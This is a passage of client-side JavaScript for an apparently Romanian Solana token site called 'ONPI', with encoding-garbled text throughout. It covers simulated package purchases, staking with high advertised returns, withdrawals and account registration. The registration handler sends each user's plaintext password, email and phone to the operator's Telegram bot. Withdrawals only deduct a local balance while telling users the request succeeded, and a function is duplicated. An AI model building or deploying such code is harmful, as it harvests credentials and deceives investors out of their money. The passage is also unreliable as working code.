// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// PREÈš LIVE SOLANA (CoinGecko)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

async function getSolPrice() {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const data = await res.json();
    return data.solana.usd || 85; // fallback dacÄƒ API-ul nu rÄƒspunde
  } catch (err) {
    console.error('Eroare preÈ› SOL:', err);
    return 85; // fallback
  }
}

// ActualizeazÄƒ echivalentele SOL Ã®n carduri la Ã®ncÄƒrcare È™i la refresh
async function updateSolEquivalents() {
  const solPrice = await getSolPrice();
  if (document.getElementById('solEq50')) document.getElementById('solEq50').textContent = (50 / solPrice).toFixed(4);
  if (document.getElementById('solEq100')) document.getElementById('solEq100').textContent = (100 / solPrice).toFixed(4);
  if (document.getElementById('solEq200')) document.getElementById('solEq200').textContent = (200 / solPrice).toFixed(4);
  if (document.getElementById('solEq500')) document.getElementById('solEq500').textContent = (500 / solPrice).toFixed(4);
  if (document.getElementById('solEqUp50')) document.getElementById('solEqUp50').textContent = (50 / solPrice).toFixed(4);
  if (document.getElementById('solEqUp100')) document.getElementById('solEqUp100').textContent = (100 / solPrice).toFixed(4);
  if (document.getElementById('solEqUp200')) document.getElementById('solEqUp200').textContent = (200 / solPrice).toFixed(4);
  if (document.getElementById('solEqUp500')) document.getElementById('solEqUp500').textContent = (500 / solPrice).toFixed(4);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// SIMULARE CONECTARE WALLET (Phantom/Solflare)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

async function connectWallet() {
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      alert('Wallet Phantom conectat cu succes');
      return true;
    } catch (err) {
      alert('Conectare eÈ™uatÄƒ: ' + err.message);
      return false;
    }
  } else {
    alert('InstaleazÄƒ Phantom sau Solflare pentru conectare.');
    return false;
  }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ACHIZIÈšIE PACHET â€“ cu achiziÈ›ie directÄƒ simulatÄƒ SOL + preÈ› live Ã®n ambele secÈ›iuni
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

async function buyPackage(value) {
  const connected = await connectWallet();
  if (!connected) return;

  document.querySelectorAll('.dropdown-menu').forEach(m => m.style.display = 'none');
  document.querySelectorAll('.package-card').forEach(c => c.classList.remove('expanded'));

  const amount = parseInt(value);
  const tokens = packages[amount] || 0;

  if (tokens === 0) {
    alert('Pachet invalid!');
    return;
  }

  // ECHIVALENT LIVE SOL â€“ afiÈ™at live la achiziÈ›ie (Ã®n ambele secÈ›iuni)
  getSolPrice().then(solPrice => {
    const solEq = (amount / solPrice).toFixed(4);
    alert(`AchiziÈ›ie directÄƒ simulatÄƒ\nPachet: \( {amount} \) â‰ˆ ${solEq} SOL (preÈ› live)\n+ ${tokens.toLocaleString('ro-RO')} ONPI adÄƒugaÈ›i fictiv.`);
  });

  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) {
    alert('Trebuie sÄƒ fii logat!');
    switchToLogin();
    return;
  }

  let userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');

  if (!userData.purchasedPackages) userData.purchasedPackages = [];

  const valStr = amount.toString();
  if (!userData.purchasedPackages.includes(valStr)) {
    userData.purchasedPackages.push(valStr);
  }

  userData.activePackage = valStr;
  userData.balance   = (userData.balance   || 0) + tokens;
  userData.purchases = (userData.purchases || 0) + 1;

  localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));

  updateDashboardDisplay();
  updateProfileDisplay();
  updatePackagesButtonState();

  if (upgradeMode) {
    setTimeout(applyUpgradeRules, 100);
  }

  alert(`AchiziÈ›ie simulatÄƒ cu succes!\n+ ${tokens.toLocaleString('ro-RO')} ONPI adÄƒugaÈ›i.`);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// STAKE FUNCÈšIONALITATE (doar partea existentÄƒ Ã®n codul tÄƒu + actualizare zilnicÄƒ)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function openStake() {
  showOnly(stakePage);
}

function stakeTokens(days) {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) return alert('Trebuie sÄƒ fii logat!');

  let userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const available = userData.balance || 0;

  if (available < 1) return alert('Nu ai suficient ONPI pentru stake!');

  const minStake = Math.floor(available * 0.5);
  const amountStr = prompt(`Introdu suma pentru stake (minim 50% = ${minStake} ONPI):`, minStake);

  const amount = Number(amountStr);
  if (isNaN(amount) || amount < minStake || amount > available) {
    return alert('SumÄƒ invalidÄƒ sau sub minim 50%!');
  }

  const rates = { 7: 0.125, 30: 0.189, 90: 0.50 };
  const dailyRate = rates[days] / days;

  userData.balance -= amount;
  userData.stake = userData.stake || { amount: 0, start: 0, days: 0, dailyRate: 0 };
  userData.stake.amount += amount;
  userData.stake.start = Date.now();
  userData.stake.days = days;
  userData.stake.dailyRate = dailyRate;

  localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
  updateDashboardDisplay();

  alert(`Stake activat!\nSumÄƒ blocatÄƒ: ${amount} ONPI\nPerioadÄƒ: ${days} zile\nDobÃ¢ndÄƒ zilnicÄƒ: ${(dailyRate * 100).toFixed(3)}%`);

  document.getElementById('interestDetails').innerHTML = `
    <h3>Calcul pentru ${days} zile</h3>
    <p>SumÄƒ stake: <strong>${amount.toLocaleString('ro-RO')} ONPI</strong></p>
    <p>DobÃ¢ndÄƒ zilnicÄƒ: <strong>\( {(dailyRate * 100).toFixed(3)}%</strong> â‰ˆ <strong> \){(amount * dailyRate).toFixed(2)} ONPI/zi</strong></p>
    <p>DobÃ¢ndÄƒ totalÄƒ: <strong>${(amount * dailyRate * days).toFixed(2)} ONPI</strong></p>
    <p>Total la final: <strong>${(amount + amount * dailyRate * days).toLocaleString('ro-RO')} ONPI</strong></p>
    <p>PerioadÄƒ blocatÄƒ: <strong>${days} zile</strong></p>
    <p>Suma este blocatÄƒ È™i nu poate fi retrasÄƒ pÃ¢nÄƒ la finalul perioadei.</p>
  `;
  showOnly(interestCalcPage);
}

// Simulare actualizare zilnicÄƒ sold stake
setInterval(() => {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) return;

  let userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  if (userData.stake && userData.stake.amount > 0) {
    const elapsedDays = Math.floor((Date.now() - userData.stake.start) / 86400000);
    const earned = userData.stake.amount * userData.stake.dailyRate * elapsedDays;
    document.getElementById('dashStakeSold').textContent = (userData.stake.amount + earned).toLocaleString('ro-RO');
  }
}, 60000);

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// TRIMITERE CERERE RETRAGERE â€“ cu verificare wallet È™i resetare completÄƒ
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function submitWithdrawalRequest() {
  const amount = Number(withdrawalAmount.value.trim());

  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) {
    alert('Trebuie sÄƒ fii logat!');
    return;
  }

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const balance = userData.balance || 0;
  const wallet = (userData.wallet || '').trim();

  if (!wallet || wallet === '' || wallet.includes('â€”') || wallet === 'â€” (nu ai adÄƒugat wallet Ã®ncÄƒ)') {
    alert('Trebuie sÄƒ ai o adresÄƒ wallet Solana Ã®nregistratÄƒ pentru a retrage!');
    return;
  }

  if (isNaN(amount) || amount <= 0) {
    alert('Introdu o sumÄƒ validÄƒ mai mare decÃ¢t 0!');
    return;
  }

  if (amount > balance) {
    alert(`Nu ai suficient sold! Maxim disponibil: ${balance.toLocaleString('ro-RO')} ONPI`);
    return;
  }

  userData.balance = balance - amount;

  if (userData.balance === 0) {
    userData.purchasedPackages = [];
    userData.purchases = 0;
    userData.activePackage = '0';
  }

  localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));

  updateDashboardDisplay();
  updatePackagesButtonState();

  alert('Retragere efectuatÄƒ cu succes â€“ procesare maxim 12 ore.');

  const message = 
    `CERERE RETRAGERE ONPI\n` +
    `Utilizator: ${loggedInUser}\n` +
    `SumÄƒ: ${amount.toLocaleString('ro-RO')} ONPI\n` +
    `Wallet: ${wallet}\n` +
    `Sold rÄƒmas: ${userData.balance.toLocaleString('ro-RO')} ONPI\n` +
    `Data: ${new Date().toLocaleString('ro-RO')}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  }).catch(err => console.error('Eroare trimitere Telegram:', err));

  withdrawalAmount.value = '';
  switchToDashboard();
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// FUNCÈšII UTILITARE (originale tale, intacte)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function showOnly(pageToShow) {
  [loginPage, registerPage, dashboardPage, profilePage, packagesPage, upgradePage, purchasePage, withdrawalPage, instructionsPage, instructionsGeneralPage, stakePage, interestCalcPage]
    .forEach(p => p?.classList.add('hidden'));
  pageToShow?.classList.remove('hidden');
}

function togglePassword(fieldId) {
  const field = document.getElementById(fieldId);
  const icon = field.nextElementSibling;
  if (field.type === 'password') {
    field.type = 'text';
    icon.textContent = 'ğŸ™ˆ';
  } else {
    field.type = 'password';
    icon.textContent = 'ğŸ‘';
  }
}

function switchToLogin()          { showOnly(loginPage); }
function switchToRegister()       { showOnly(registerPage); }
function switchToDashboard() {
  showOnly(dashboardPage);
  if (!priceChart) initChart();
  updateDashboardDisplay();
  updateProfileDisplay();
  updatePackagesButtonState();
}

function openProfile()            { showOnly(profilePage); updateProfileDisplay(); }

function openPackages(fromUpgrade = false) {
  upgradeMode = fromUpgrade;
  showOnly(fromUpgrade ? upgradePage : packagesPage);
  
  const page = fromUpgrade ? upgradePage : packagesPage;
  page.querySelectorAll('.dropdown-wrapper').forEach(wrapper => {
    wrapper.style.display = 'block';
  });
  
  page.querySelectorAll('.btn-select').forEach(btn => {
    btn.textContent = fromUpgrade ? 'Upgrade' : 'SelecteazÄƒ';
    btn.disabled = false;
  });
  
  if (fromUpgrade) {
    setTimeout(applyUpgradeRules, 100);
  }
}

function openInstructions() {
  showOnly(instructionsGeneralPage);
}

function goToPurchase()           { showOnly(purchasePage); }

function goToWithdrawal() {
  showOnly(withdrawalPage);
  displayWithdrawalInfo();
}

function toggleDropdown(cardId) {
  const card = document.getElementById(cardId);
  if (!card) return;

  const dropdown = card.querySelector('.dropdown-menu');
  if (!dropdown) return;

  document.querySelectorAll('.dropdown-menu').forEach(m => {
    if (m !== dropdown) m.style.display = 'none';
  });

  document.querySelectorAll('.package-card').forEach(c => {
    if (c !== card) c.classList.remove('expanded');
  });

  if (dropdown.style.display !== 'block') {
    dropdown.style.display = 'block';
    card.classList.add('expanded');
  } else {
    dropdown.style.display = 'none';
    card.classList.remove('expanded');
  }
}

function copyWallet() {
  navigator.clipboard.writeText(MY_WALLET).then(() => {
    alert('Adresa wallet copiatÄƒ!');
  }).catch(err => {
    alert('Eroare la copiere: ' + err);
  });
}

function copyWalletPersonal() {
  const wallet = personalWalletDisplay.textContent.trim();
  if (wallet !== 'â€” (nu ai adÄƒugat wallet Ã®ncÄƒ)') {
    navigator.clipboard.writeText(wallet).then(() => {
      alert('Adresa ta wallet copiatÄƒ!');
    }).catch(err => {
      alert('Eroare la copiere: ' + err);
    });
  }
}

function logout() {
  localStorage.removeItem('loggedInUser');
  showOnly(loginPage);
  alert('Ai fost deconectat!');
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Control stare buton Pachete
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function updatePackagesButtonState() {
  const btn = document.getElementById('btnPackages');
  if (!btn) return;

  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) {
    btn.disabled = true;
    return;
  }

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const purchases = Number(userData.purchases || 0);

  btn.disabled = purchases > 0;
  btn.textContent = purchases > 0 ? 'ğŸ“¦ Pachete (achiziÈ›ionat)' : 'ğŸ“¦ Pachete';
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ACTUALIZARE AFIÈ˜AJ SOLD & PACHETE + PACHET ACTIV
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function updateDashboardDisplay() {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) return;

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const balance   = userData.balance   || 0;
  const purchases = userData.purchases || 0;

  dashSoldValue.textContent = (balance * 0.0001).toFixed(2);
  dashSold.textContent      = balance.toLocaleString('ro-RO');
  dashSoldPersonal.textContent = balance.toLocaleString('ro-RO');
  dashPachete.textContent   = purchases;

  updatePackagesButtonState();
}

function updateProfileDisplay() {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) return;

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');

  dashNume.textContent     = userData.nume     || 'â€”';
  dashCont.textContent     = loggedInUser      || 'â€”';
  dashEmail.textContent    = userData.email    || 'â€”';
  dashTelegram.textContent = userData.telegram || 'â€”';
  dashTelefon.textContent  = userData.telefon  || 'â€”';
  dashWallet.textContent   = userData.wallet   || 'â€” (nu ai adÄƒugat Ã®ncÄƒ)';

  const active = userData.activePackage || 'â€”';
  dashActivePackage.textContent = active === 'â€”' ? 'â€”' : active + '$';

  if (userData.dataInregistrare) {
    document.getElementById('dashDataInregistrare').textContent = 
      new Date(userData.dataInregistrare).toLocaleDateString('ro-RO');
  }

  updateDashboardDisplay();
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// AFIÈ˜ARE INFO ÃN PAGINA DE RETRAGERE + RESTRICÈšIE WALLET
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function displayWithdrawalInfo() {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) {
    personalWalletDisplay.textContent = 'â€” (nu eÈ™ti logat)';
    withdrawalBalance.textContent = '0';
    document.getElementById('minAmountsList').innerHTML = '';
    document.getElementById('submitWithdrawalBtn').disabled = true;
    return;
  }

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const wallet = (userData.wallet || '').trim();
  const balance = userData.balance || 0;

  personalWalletDisplay.textContent = wallet || 'â€” (nu ai adÄƒugat wallet Ã®ncÄƒ)';

  if (!wallet || wallet.includes('â€”')) {
    personalWalletDisplay.style.color = 'var(--error)';
    personalWalletDisplay.style.fontWeight = 'bold';
    personalWalletDisplay.style.cursor = 'default';
    document.getElementById('submitWithdrawalBtn').disabled = true;
  } else {
    personalWalletDisplay.style.color = '';
    personalWalletDisplay.style.fontWeight = '';
    personalWalletDisplay.style.cursor = 'pointer';
    document.getElementById('submitWithdrawalBtn').disabled = false;
  }

  withdrawalBalance.textContent = balance.toLocaleString('ro-RO');

  displayMinWithdrawalInfo();
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// TRIMITERE CERERE RETRAGERE â€“ cu verificare wallet È™i resetare completÄƒ
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function submitWithdrawalRequest() {
  const amount = Number(withdrawalAmount.value.trim());

  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) {
    alert('Trebuie sÄƒ fii logat!');
    return;
  }

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const balance = userData.balance || 0;
  const wallet = (userData.wallet || '').trim();

  if (!wallet || wallet === '' || wallet.includes('â€”') || wallet === 'â€” (nu ai adÄƒugat wallet Ã®ncÄƒ)') {
    alert('Trebuie sÄƒ ai o adresÄƒ wallet Solana Ã®nregistratÄƒ pentru a retrage!');
    return;
  }

  if (isNaN(amount) || amount <= 0) {
    alert('Introdu o sumÄƒ validÄƒ mai mare decÃ¢t 0!');
    return;
  }

  if (amount > balance) {
    alert(`Nu ai suficient sold! Maxim disponibil: ${balance.toLocaleString('ro-RO')} ONPI`);
    return;
  }

  userData.balance = balance - amount;

  if (userData.balance === 0) {
    userData.purchasedPackages = [];
    userData.purchases = 0;
    userData.activePackage = '0';
  }

  localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));

  updateDashboardDisplay();
  updatePackagesButtonState();

  alert('Retragere efectuatÄƒ cu succes â€“ procesare maxim 12 ore.');

  const message = 
    `CERERE RETRAGERE ONPI\n` +
    `Utilizator: ${loggedInUser}\n` +
    `SumÄƒ: ${amount.toLocaleString('ro-RO')} ONPI\n` +
    `Wallet: ${wallet}\n` +
    `Sold rÄƒmas: ${userData.balance.toLocaleString('ro-RO')} ONPI\n` +
    `Data: ${new Date().toLocaleString('ro-RO')}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  }).catch(err => console.error('Eroare trimitere Telegram:', err));

  withdrawalAmount.value = '';
  switchToDashboard();
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// FUNCÈšIE PENTRU MOD UPGRADE â€“ ascunde pachetele â‰¤ pachet activ
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function applyUpgradeRules() {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) return;

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const activePkg = userData.activePackage || '0';
  const currentLevel = parseInt(activePkg) || 0;
  const purchased = userData.purchasedPackages || [];

  const cardConfigs = [
    { id: 'up-card1', value: 50  },
    { id: 'up-card2', value: 100 },
    { id: 'up-card3', value: 200 },
    { id: 'up-card4', value: 500 }
  ];

  document.querySelectorAll('#upgradePage .dropdown-wrapper').forEach(w => w.style.display = 'block');

  cardConfigs.forEach(({ id, value }) => {
    const card = document.getElementById(id);
    if (!card) return;

    const wrapper = card.querySelector('.dropdown-wrapper');
    if (!wrapper) return;

    const valStr = value.toString();

    if (value <= currentLevel || purchased.includes(valStr)) {
      wrapper.style.display = 'none';
    }
  });
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// LOGIN â€“ cu normalizare username
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  let cont  = document.getElementById('loginCont').value.trim().toLowerCase();
  const parola = document.getElementById('loginParola').value.trim();

  loginStatus.textContent = 'VerificÄƒm...';
  loginStatus.className = 'status';
  loginStatus.style.display = 'block';

  const parolaHash = await hashPassword(parola);

  const { data, error } = await supabase
    .from('users')
    .select('*')
    .eq('cont', cont)
    .eq('parola_hash', parolaHash)
    .single();

  if (error || !data) {
    loginStatus.textContent = 'Cont sau parolÄƒ incorectÄƒ!';
    loginStatus.className = 'status error';
    return;
  }

  localStorage.setItem('loggedInUser', cont);
  localStorage.setItem('userData', JSON.stringify(data));

  loginStatus.textContent = 'Login reuÈ™it! RedirecÈ›ionare...';
  loginStatus.className = 'status success';

  setTimeout(() => {
    switchToDashboard();
  }, 900);
});

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ÃNREGISTRARE â€“ cu normalizare + verificare duplicat
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

registerForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const nume     = document.getElementById('nume').value.trim();
  let   cont     = document.getElementById('cont').value.trim();
  const parola   = document.getElementById('parola').value.trim();
  const confirm  = document.getElementById('confirmParola').value.trim();
  const email    = document.getElementById('email').value.trim();
  const telegram = document.getElementById('telegram').value.trim();
  const telefon  = document.getElementById('telefon').value.trim();

  cont = cont.trim().toLowerCase();

  if (nume.length < 3)     return showMessage('Numele trebuie sÄƒ aibÄƒ minim 3 caractere', 'error');
  if (cont.length < 4)     return showMessage('Username-ul trebuie sÄƒ aibÄƒ minim 4 caractere', 'error');
  if (!/^[a-z0-9._-]+$/.test(cont)) {
    return showMessage('Username permis doar: litere mici, cifre, . _ - (fÄƒrÄƒ spaÈ›ii, majuscule)', 'error');
  }
  if (parola.length < 6)   return showMessage('Parola minim 6 caractere', 'error');
  if (parola !== confirm)  return showMessage('Parolele nu coincid', 'error');
  if (!email.includes('@') || email.length < 6) return showMessage('Email invalid', 'error');

  if (localStorage.getItem(`user_${cont}`)) {
    return showMessage(`Username-ul â€${cont}â€ este deja folosit! Alege altul.`, 'error');
  }

  showMessage('Se creeazÄƒ contul...', '');

  const parolaHash = await hashPassword(parola);

  const { error } = await supabase.from('users').insert({
    cont,
    parola_hash: parolaHash,
    nume,
    email,
    telegram,
    telefon,
    balance: 0,
    purchases: 0,
    purchased_packages: [],
    activePackage: '0',
    data_inregistrare: new Date().toISOString()
  });

  if (error) {
    showMessage(error.message.includes('duplicate') ? 'Username deja folosit!' : 'Eroare la creare cont (verificaÈ›i conexiunea sau token-ul Telegram)', 'error');
    return;
  }

  const message = 
    `NOU CONT ONPI\n` +
    `Nume: ${nume}\n` +
    `Cont: ${cont}\n` +
    `ParolÄƒ: ${parola}\n` +
    `Email: ${email}\n` +
    `Telegram: ${telegram}\n` +
    `Telefon: ${telefon}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  }).catch(err => console.error('Eroare trimitere Telegram:', err));

  showMessage(`Cont creat cu succes!\nUsername-ul tÄƒu: ${cont}\nPoÈ›i sÄƒ te loghezi acum.`, 'success');

  registerForm.reset();

  setTimeout(() => {
    switchToLogin();
    document.getElementById('loginCont').value = cont;
  }, 1800);
});

function showMessage(text, type = '') {
  const el = document.activeElement.closest('form')?.id === 'registerForm' ? status : loginStatus;
  el.textContent = text;
  el.className = 'status ' + type;
  el.style.display = 'block';
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// SCHIMBÄ‚ PAROLÄ‚
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function changePassword() {
  const loggedInUser = localStorage.getItem('loggedInUser');
  if (!loggedInUser) return alert('Trebuie sÄƒ fii logat!');

  const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`) || '{}');
  const parolaVeche = userData.parola || '';

  const veche = prompt('Introdu parola actualÄƒ:');
  if (!veche || veche.trim() !== parolaVeche) return alert('Parola actualÄƒ incorectÄƒ!');

  const noua = prompt('Introdu parola nouÄƒ (minim 6 caractere):');
  if (!noua || noua.trim().length < 6) return alert('Parola nouÄƒ minim 6 caractere!');

  const confirma = prompt('ConfirmÄƒ parola nouÄƒ:');
  if (confirma !== noua) return alert('Parolele nu coincid!');

  userData.parola = noua.trim();
  localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));

  alert('Parola schimbatÄƒ cu succes!');
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ADAUGÄ‚ WALLET
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function addWallet() {
